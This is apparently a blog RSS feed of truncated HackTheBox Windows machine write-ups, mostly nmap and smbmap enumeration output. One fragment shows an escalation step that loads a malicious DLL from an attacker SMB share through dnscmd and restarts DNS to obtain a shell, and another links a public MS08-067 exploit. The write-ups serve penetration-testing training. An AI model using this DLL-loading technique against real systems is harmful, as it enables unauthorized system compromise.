Payload size: 460 bytes
Final size of dll file: 9216 bytes
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Now we need to register &lt;code>dll&lt;/code>
&lt;ul>
&lt;li>We could upload it or share it via &lt;code>smb&lt;/code>&lt;/li>
&lt;li>Start &lt;code>impacket-smbserver&lt;/code>&lt;/li>
&lt;li>Then load &lt;code>evil.dll&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ impacket-smbserver share $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\Users\ryan&amp;gt; dnscmd.exe localhost /config /serverlevelplugindll \\10.10.16.5\share\evil.dll
Registry property serverlevelplugindll successfully reset.
Command completed successfully.
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Next we need restart &lt;code>dns&lt;/code> service&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\Users\ryan\Documents&amp;gt; sc.exe stop dns
SERVICE_NAME: dns
TYPE : 10 WIN32_OWN_PROCESS
STATE : 3 STOP_PENDING
(STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
WIN32_EXIT_CODE : 0 (0x0)
SERVICE_EXIT_CODE : 0 (0x0)
CHECKPOINT : 0x0
WAIT_HINT : 0x0
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\Users\ryan\Documents&amp;gt; sc.exe start dns
SERVICE_NAME: dns
TYPE : 10 WIN32_OWN_PROCESS
STATE : 2 START_PENDING
(NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
WIN32_EXIT_CODE : 0 (0x0)
SERVICE_EXIT_CODE : 0 (0x0)
CHECKPOINT : 0x0
WAIT_HINT : 0x7d0
PID : 1668
FLAGS :
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>If everything is okay, we should receive shell&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/resolute/images/3.png">&lt;/p></description></item><item><title>[HTB] Machine: SecNotes</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/secnotes/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/secnotes/</guid><description>&lt;h1 id="secnotes">SecNotes&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.97 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 18:49 BST
Nmap scan report for 10.10.10.97 (10.10.10.97)
Host is up (0.092s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT STATE SERVICE
80/tcp open http
445/tcp open microsoft-ds
8808/tcp open ssports-bcast
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p80,445,8808 -sC -sV 10.10.10.97 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 18:54 BST
Nmap scan report for 10.10.10.97 (10.10.10.97)
Host is up (0.13s latency).
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 10.0
| http-methods:
|_ Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
445/tcp open 10.10.100 Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open http Microsoft IIS httpd 10.0
| http-methods:
|_ Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb-security-mode:
| account_used: &amp;lt;blank&amp;gt;
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h19m24s, deviation: 4h02m30s, median: -35s
| smb-os-discovery:
| OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
| OS CPE: cpe:/o:microsoft:windows_10::-
| Computer name: SECNOTES
| NetBIOS computer name: SECNOTES\x00
| Workgroup: HTB\x00
|_ System time: 2023-09-02T10:53:49-07:00
| smb2-time:
| date: 2023-09-02T17:53:53
|_ start_date: N/A
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled but not required
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Web Server&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/secnotes/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Nest</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/nest/</link><pubDate>Mon, 26 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/nest/</guid><description>&lt;h1 id="nest">Nest&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -sC -sV -Pn 10.10.10.178
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 19:24 BST
Nmap scan report for 10.10.10.178 (10.10.10.178)
Host is up (0.10s latency).
PORT STATE SERVICE VERSION
445/tcp open microsoft-ds?
4386/tcp open unknown
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
| Reporting Service V1.2
| FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
| Reporting Service V1.2
| Unrecognised command
| Help:
| Reporting Service V1.2
| This service allows users to run queries against databases using the legacy HQK format
| AVAILABLE COMMANDS ---
| LIST
| SETDIR &amp;lt;Directory_Name&amp;gt;
| RUNQUERY &amp;lt;Query_ID&amp;gt;
| DEBUG &amp;lt;Password&amp;gt;
|_ HELP &amp;lt;Command&amp;gt;
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.93%I=7%D=7/4%Time=64A463FC%P=x86_64-pc-linux-gnu%r(NUL
SF:L,21,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(GenericLine
SF:s,3A,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;\r\nUnrecognised
SF:\x20command\r\n&amp;gt;&amp;#34;)%r(GetRequest,3A,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20
SF:V1\.2\r\n\r\n&amp;gt;\r\nUnrecognised\x20command\r\n&amp;gt;&amp;#34;)%r(HTTPOptions,3A,&amp;#34;\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;\r\nUnrecognised\x20comman
SF:d\r\n&amp;gt;&amp;#34;)%r(RTSPRequest,3A,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n
SF:\r\n&amp;gt;\r\nUnrecognised\x20command\r\n&amp;gt;&amp;#34;)%r(RPCCheck,21,&amp;#34;\r\nHQK\x20Repor
SF:ting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(DNSVersionBindReqTCP,21,&amp;#34;\r\nHQK\
SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(DNSStatusRequestTCP,21,&amp;#34;\
SF:r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(Help,F2,&amp;#34;\r\nHQK\x
SF:20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;\r\nThis\x20service\x20allows\x
SF:20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20the
SF:\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---\
SF:r\n\r\nLIST\r\nSETDIR\x20&amp;lt;Directory_Name&amp;gt;\r\nRUNQUERY\x20&amp;lt;Query_ID&amp;gt;\r\n
SF:DEBUG\x20&amp;lt;Password&amp;gt;\r\nHELP\x20&amp;lt;Command&amp;gt;\r\n&amp;gt;&amp;#34;)%r(SSLSessionReq,21,&amp;#34;\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(TerminalServerCookie
SF:,21,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(TLSSessionRe
SF:q,21,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(Kerberos,21
SF:,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(SMBProgNeg,21,&amp;#34;
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(X11Probe,21,&amp;#34;\r\n
SF:HQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(FourOhFourRequest,3A,
SF:&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;\r\nUnrecognised\x20c
SF:ommand\r\n&amp;gt;&amp;#34;)%r(LPDString,21,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n&amp;gt;&amp;#34;)%r(LDAPSearchReq,21,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n&amp;gt;&amp;#34;)%r(LDAPBindReq,21,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\
SF:r\n\r\n&amp;gt;&amp;#34;)%r(SIPOptions,3A,&amp;#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
SF:n\r\n&amp;gt;\r\nUnrecognised\x20command\r\n&amp;gt;&amp;#34;)%r(LANDesk-RC,21,&amp;#34;\r\nHQK\x20Re
SF:porting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;)%r(TerminalServer,21,&amp;#34;\r\nHQK\x20
SF:Reporting\x20Service\x20V1\.2\r\n\r\n&amp;gt;&amp;#34;);
Host script results:
|_clock-skew: -32s
| smb2-security-mode:
| 210:
|_ Message signing enabled but not required
| smb2-time:
| date: 2023-07-04T18:27:07
|_ start_date: 2023-07-04T18:17:55
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.70 seconds
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>smb&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/nest/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Bastion</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/bastion/</link><pubDate>Fri, 16 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/bastion/</guid><description>&lt;h1 id="bastion">Bastion&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -sC -sV 10.10.10.134 -T4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 21:20 BST
Nmap scan report for 10.10.10.134 (10.10.10.134)
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
| 2048 3a56ae753c780ec8564dcb1c22bf458a (RSA)
| 256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA)
|_ 256 935f5daaca9f53e7f282e664a8a3a018 (ED25519)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
| date: 2023-06-17T20:20:50
|_ start_date: 2023-06-17T18:27:22
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -40m29s, deviation: 1h09m15s, median: -30s
| smb2-security-mode:
| 311:
|_ Message signing enabled but not required
| smb-os-discovery:
| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
| Computer name: Bastion
| NetBIOS computer name: BASTION\x00
| Workgroup: WORKGROUP\x00
|_ System time: 2023-06-17T22:20:49+02:00
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.14 seconds
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>smbmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ smbmap -H 10.10.10.134 -R -u pentest
[+] Guest session IP: 10.10.10.134:445 Name: 10.10.10.134
[-] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\UEQFPWNJOX, please remove manually
Disk Permissions Comment
---- ----------- -------
ADMIN$ NO ACCESS Remote Admin
Backups READ, WRITE
.\Backups\*
dr--r--r-- 0 Sun Jun 18 09:58:58 2023 .
dr--r--r-- 0 Sun Jun 18 09:58:58 2023 ..
fw--w--w-- 116 Tue Apr 16 12:43:19 2019 note.txt
fr--r--r-- 0 Fri Feb 22 12:43:28 2019 SDT65CB.tmp
dr--r--r-- 0 Sun Jun 18 09:58:58 2023 UEQFPWNJOX
dr--r--r-- 0 Fri Feb 22 12:44:02 2019 WindowsImageBackup
.\Backups\WindowsImageBackup\*
dr--r--r-- 0 Fri Feb 22 12:44:02 2019 .
dr--r--r-- 0 Fri Feb 22 12:44:02 2019 ..
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 L4mpje-PC
.\Backups\WindowsImageBackup\L4mpje-PC\*
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 ..
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 Backup 2019-02-22 124351
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 Catalog
fr--r--r-- 16 Fri Feb 22 12:44:02 2019 MediaId
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 SPPMetadataCache
.\Backups\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\*
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 ..
fr--r--r-- 37761024 Fri Feb 22 12:44:03 2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
fr--r--r-- 5418299392 Fri Feb 22 12:45:32 2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
fr--r--r-- 1186 Fri Feb 22 12:45:32 2019 BackupSpecs.xml
fr--r--r-- 1078 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
fr--r--r-- 8930 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
fr--r--r-- 6542 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
fr--r--r-- 2894 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
fr--r--r-- 1488 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
fr--r--r-- 1484 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
fr--r--r-- 3844 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
fr--r--r-- 3988 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
fr--r--r-- 7110 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
fr--r--r-- 2374620 Fri Feb 22 12:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
.\Backups\WindowsImageBackup\L4mpje-PC\Catalog\*
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 ..
fr--r--r-- 5698 Fri Feb 22 12:45:32 2019 BackupGlobalCatalog
fr--r--r-- 7440 Fri Feb 22 12:45:32 2019 GlobalCatalog
.\Backups\WindowsImageBackup\L4mpje-PC\SPPMetadataCache\*
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 .
dr--r--r-- 0 Fri Feb 22 12:45:32 2019 ..
fr--r--r-- 57848 Fri Feb 22 12:45:32 2019 {cd113385-65ff-4ea2-8ced-5630f6feca8f}
C$ NO ACCESS Default share
IPC$ READ ONLY Remote IPC
.\IPC$\*
fr--r--r-- 3 Sun Dec 31 23:58:45 1600 InitShutdown
fr--r--r-- 4 Sun Dec 31 23:58:45 1600 lsass
fr--r--r-- 3 Sun Dec 31 23:58:45 1600 ntsvcs
fr--r--r-- 3 Sun Dec 31 23:58:45 1600 scerpc
fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\CatalogChangeListener-2fc-0
fr--r--r-- 3 Sun Dec 31 23:58:45 1600 epmapper
fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\CatalogChangeListener-1e8-0
fr--r--r-- 3 Sun Dec 31 23:58:45 1600 LSM_API_service
fr--r--r-- 3 Sun Dec 31 23:58:45 1600 eventlog
fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\CatalogChangeListener-3b8-0
fr--r--r-- 3 Sun Dec 31 23:58:45 1600 atsvc
fr--r--r-- 4 Sun Dec 31 23:58:45 1600 wkssvc
fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\CatalogChangeListener-364-0
fr--r--r-- 3 Sun Dec 31 23:58:45 1600 trkwks
fr--r--r-- 3 Sun Dec 31 23:58:45 1600 spoolss
fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\CatalogChangeListener-66c-0
fr--r--r-- 3 Sun Dec 31 23:58:45 1600 W32TIME_ALT
fr--r--r-- 1 Sun Dec 31 23:58:45 1600 openssh-ssh-agent
fr--r--r-- 4 Sun Dec 31 23:58:45 1600 srvsvc
fr--r--r-- 1 Sun Dec 31 23:58:45 1600 vgauth-service
fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\CatalogChangeListener-5ec-0
fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\CatalogChangeListener-264-0
fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\CatalogChangeListener-26c-0
&lt;/code>&lt;/pre>&lt;h2 id="foothold">Foothold&lt;/h2>
&lt;ul>
&lt;li>Let&amp;rsquo;s check the &lt;code>note.txt&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/bastion/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Active</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/active/</link><pubDate>Wed, 07 Jun 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/active/</guid><description>&lt;h1 id="active">Active&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -sC -sV 10.10.10.100
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 09:34 BST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 5.75% done; ETC: 09:34 (0:00:16 remaining)
Nmap scan report for 10.10.10.100 (10.10.10.100)
Host is up (0.17s latency).
Not shown: 982 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-11 08:34:18Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
49152/tcp open msrpc Microsoft Windows RPC
49153/tcp open msrpc Microsoft Windows RPC
49154/tcp open msrpc Microsoft Windows RPC
49155/tcp open msrpc Microsoft Windows RPC
49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49158/tcp open msrpc Microsoft Windows RPC
49165/tcp open msrpc Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
Host script results:
| smb2-time:
| date: 2023-06-11T08:35:17
|_ start_date: 2023-06-11T08:16:24
| smb2-security-mode:
| 210:
|_ Message signing enabled and required
|_clock-skew: -30s
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.06 seconds
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>SMB&lt;/code> enumeration
&lt;ul>
&lt;li>&lt;code>enum4linux 10.10.10.100&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/active/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Legacy</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/legacy/</link><pubDate>Thu, 25 May 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/legacy/</guid><description>&lt;h1 id="legacy">Legacy&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>Nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>┌──(kali㉿kali)-[~]
└─$ nmap -Pn -sC -sV 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:11 BST
Nmap scan report for 10.10.10.4 (10.10.10.4)
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m11s, deviation: 2h07m16s, median: 4d22h57m11s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 005056b90f40 (VMware)
| smb-os-discovery:
| OS: Windows XP (Windows 2000 LAN Manager)
| OS CPE: cpe:/o:microsoft:windows_xp::-
| Computer name: legacy
| NetBIOS computer name: LEGACY\x00
| Workgroup: HTB\x00
|_ System time: 2023-06-04T22:09:21+03:00
| smb-security-mode:
| account_used: &amp;lt;blank&amp;gt;
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.71 seconds
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>Nmap vulnerability scripts&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>┌──(kali㉿kali)-[~]
└─$ nmap -Pn -p139,445,135 --script *vuln* 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:17 BST
Nmap scan report for 10.10.10.4 (10.10.10.4)
Host is up (0.11s latency).
PORT STATE SERVICE
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067:
| VULNERABLE:
| Microsoft Windows system vulnerable to remote code execution (MS08-067)
| State: VULNERABLE
| IDs: CVE:CVE-2008-4250
| The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
| Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
| code via a crafted RPC request that triggers the overflow during path canonicalization.
|
| Disclosure date: 2008-10-23
| References:
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
| smb-vuln-ms17-010:
| VULNERABLE:
| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
| State: VULNERABLE
| IDs: CVE:CVE-2017-0143
| Risk factor: HIGH
| A critical remote code execution vulnerability exists in Microsoft SMBv1
| servers (ms17-010).
|
| Disclosure date: 2017-03-14
| References:
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Right away it states that it&amp;rsquo;s vulnerable to &lt;a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067" target="_blank" rel="noopener">MS08-067&lt;/a>
&lt;ul>
&lt;li>&lt;a href="https://www.exploit-db.com/exploits/7104" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/7104&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/legacy/images/1.png">&lt;/p></description></item></channel></rss>